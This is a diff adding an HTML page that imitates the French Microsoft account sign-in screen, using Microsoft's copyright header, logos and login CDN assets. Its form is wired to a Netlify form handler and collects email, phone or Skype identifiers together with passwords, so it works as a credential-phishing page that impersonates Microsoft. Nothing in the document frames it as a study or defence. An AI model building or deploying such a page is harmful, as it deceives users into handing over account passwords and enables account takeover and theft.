@@ -1,0 +1,231 @@
+<!-- Copyright (C) Microsoft Corporation. All rights reserved. -->
+<!DOCTYPE html>
+<!-- ServerInfo: BL02PFD2ABC5749 2022.04.07.19.00.02 LocVer:0 -->
+<!-- PreprocessInfo: CBA-0407_184540:SA2PNPF0000235F, 2022-04-07T18:57:01.0268356-07:00 - Version: 16,0,29393,1 -->
+<!-- RequestLCID: 1036, Market:FR-FR, PrefCountry: FR, LangLCID: 1036, LangISO: FR -->
+<html lang="en">
+    <head>
+		<meta charset="utf-8" />
+	    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
+		<link rel="stylesheet" href="assets/css/main.css" /><noscript>
+		<link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+		<noscript>
+	    <meta http-equiv="Refresh" content="0; URL="/>Le compte Microsoft nécessite JavaScript pour la connexion. Ce navigateur Web ne prend pas en charge JavaScript ou les scripts sont bloqués.<br /><br />Pour savoir si votre navigateur prend en charge JavaScript ou pour autoriser les scripts, reportez-vous à son aide en ligne.</noscript>
+	    <title>Se connecter à votre compte Microsoft</title>
+	    <link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29393.1/images/favicon.ico">
+	    <link rel="stylesheet" href="https://logincdn.msauth.net/16.000/Converged_v21036_aaRUc92kCx1I0HSCbabz7g2.css">   
+        <link rel="icon" type="images/png" href="https://logincdn.msauth.net/16.000.29393.1/images/favicon.ico">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+		<link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29393.1/images/favicon.ico">
+    </head>
+    <body>
+                <div id="wrapper">
+                    <section id="main">
+    <!-- Google Tag Manager (noscript) -->
+            <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-TH3SH4D" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->	
+	
+	    <form action="POST" data-netlify="true">
+	
+	<!-- ko if: loadBannerLogo -->
+            <div data-bind="component: { name: 'logo-control',
+            params: {
+                isChinaDc: svr.fIsChinaDc,
+                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->
+
+    <!-- ko if: bannerLogoUrl --><!-- /ko -->
+<div style="text-align: left">
+<img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+<!-- /ko --></div></div>
+
+        <!-- /ko -->
+
+        <!-- ko if: svr.c9 && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->
+
+        <!-- ko if: asyncInitReady -->
+        <div role="main" data-bind="component: { name: 'pagination-control',
+            publicMethods: paginationControlMethods,
+            params: {
+                enableCssAnimation: svr.ax,
+                disableAnimationIfAnimationEndUnsupported: svr.Cf,
+                initialViewId: initialViewId,
+                currentViewId: currentViewId,
+                initialSharedData: initialSharedData,
+                initialError: $loginPage.getServerError() },
+            event: {
+                cancel: paginationControl_onCancel,
+                load: paginationControlHelper.onLoad,
+                unload: paginationControlHelper.onUnload,
+                loadView: view_onLoadView,
+                showView: view_onShow,
+                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
+                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->
+
+<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
+    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.I) --><!-- /ko -->
+
+    <div class="pagination-view animate slide-in-next" data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.I),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }">
+
+        <!-- ko foreach: views -->
+            <!-- ko if: $parent.currentViewIndex() === $index() -->
+                <!-- ko template: { nodes: [$data], data: $parent } -->
+			<div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
+                params: {
+                    serverData: svr,
+                    serverError: initialError,
+                    isInitialView: isInitialState,
+                    displayName: sharedData.displayName,
+                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
+                    prefillNames: $loginPage.prefillNames,
+                    flowToken: sharedData.flowToken,
+                    availableSignupCreds: sharedData.availableSignupCreds },
+                event: {
+                    redirect: $loginPage.view_onRedirect,
+                    setPendingRequest: $loginPage.view_onSetPendingRequest,
+                    registerDialog: $loginPage.view_onRegisterDialog,
+                    unregisterDialog: $loginPage.view_onUnregisterDialog,
+                    showDialog: $loginPage.view_onShowDialog,
+                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
+                    agreementClick: $loginPage.footer_agreementClick } }"><!--  -->
+
+<div data-bind="component: { name: 'header-control',
+    params: {
+        serverData: svr,
+        title: str['WF_STR_HeaderDefault_Title'] } }"><div style="text-align: left">
+    <div class="row title ext-title" data-bind="externalCss: { 'title': true }">
+        <div role="heading" aria-level="1" data-bind="text: title">Connexion</div>
+        <!-- ko if: isSubtitleVisible --><!-- /ko -->
+    </div>
+
+    <!-- ko if: headerDescription --><!-- /ko -->
+</div></div>
+
+							<div>
+								
+								<div>
+									<input type="email" name="email" id="aria-label="Saisissez votre contact e-mail, téléphone ou Skype." aria-describedby="loginHeader usernameError" placeholder="E-mail, téléphone ou Skype" />
+								</div>
+								
+								<div>
+									<input type="password" name="password" id="password" placeholder="Mot de passe" />
+								</div>
+																
+							</div>	
+
+                            <ul class="actions special">
+                                <td>							
+								    <ul>
+									    <li style="background-color:#35A6FF">
+									        <input type="submit" value="S'identifier"/>
+								        </li>
+								    </ul>
+                                </td>								
+							</ul>	
+	
+		</form>
+	
+	<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
+    <div class="row">
+        <div class="col-md-24">
+            <div class="text-13">
+                <!-- ko if: svr.AT && !svr.AG && !svr.av -->
+                <!-- ko if: svr.Aw --><!-- /ko -->
+                
+                <!-- ko ifnot: svr.Aw -->
+                <div class="form-group" data-bind="
+                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
+                    childBindings: {
+                        'signup': {
+                            href: svr.J || '#',
+                            ariaLabel: svr.J ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
+                            click: signup_onClick } }">Vous n'avez pas encore de compte&nbsp;? <a href="" id="signup" aria-label="Créer un compte Microsoft">Créez-en un&nbsp;!</a></div>
+                <!-- /ko -->
+                <!-- /ko -->
+
+                <!-- ko ifnot: hideCantAccessYourAccount --><!-- /ko -->
+
+                <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.AI || isOfflineAccountVisible) -->
+                <div class="form-group">
+                    <a >Se connecter avec Windows Hello ou une clé de sécurité</a>
+
+                    <!-- ko component: { name: 'fido-help-button-control',
+                        params: {
+                            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable() },
+                        event: {
+                            registerDialog: onRegisterDialog,
+                            unregisterDialog: onUnregisterDialog,
+                            showDialog: onShowDialog } } --><!--  -->
+
+<span class="help-button" role="button" tabindex="0" data-bind="
+    click: fidoHelp_onClick,
+    pressEnter: fidoHelp_onClick,
+    hasFocus: hasFocus,
+    ariaLabel: isPlatformAuthenticatorAvailable ? str['CT_STR_CredentialPicker_Help_Desc_Fido'] : str['CT_STR_CredentialPicker_Help_Desc_FidoCrossPlatform']" aria-label="En savoir plus sur la connexion à l’aide de Windows Hello ou d’une clé de sécurité">
+</span>
+
+<div data-bind="component: { name: 'fido-help-dialog-content-control',
+    params: {
+        isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable },
+    event: {
+        registerDialog: onRegisterDialog,
+        unregisterDialog: onUnregisterDialog } }"><!--  -->
+
+<div data-bind="component: { name: 'dialog-content-control',
+    params: {
+        dialogId: 1,
+        data: {
+            labelledBy: 'fidoDialogTitle',
+            describedBy: 'fidoDialogDesc fidoDialogDesc2',
+            primaryButtonPreventTabbing: { direction: 'down' },
+            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable } },
+    event: {
+        registerDialog: onRegisterDialog,
+        unregisterDialog: onUnregisterDialog } }"><!-- --></div></div><!-- /ko -->
+                </div>
+            </div>
+        </div>
+    </div>
+</div></span>
+                <!-- ko foreach: $page.otherSigninOptions -->
+                <div class="row tile">
+                    <div class="table" role="button" tabindex="0" data-bind="
+                        css: { 'list-item': svr.cC },
+                        pressEnter: $page.otherSigninOptionsButton_onClick,
+                        click: $page.otherSigninOptionsButton_onClick,
+                        ariaLabel: $data.text" aria-label="Options de connexion">
+
+                        <div class="table-row">
+                            <div class="table-cell tile-img medium">
+                                <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img medium" role="presentation" data-bind="attr: { src: $data.darkIconUrl }" src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+                            </div>
+                            <div class="table-cell text-left content" data-bind="css: { 'content': !svr.cC }">
+                                <div data-bind="
+                                    text: $data.text,
+                                    attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">Options de connexion</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+					</section>
+
+		<!-- Scripts -->
+			<script>
+				if ('addEventListener' in window) {
+					window.addEventListener('load', function() { document.body.className = document.body.className.replace(/\bis-preload\b/, ''); });
+					document.body.className += (navigator.userAgent.match(/(MSIE|rv:11\.0)/) ? ' is-ie' : '');
+				}
+			</script>
+
+	</body>
+</html>
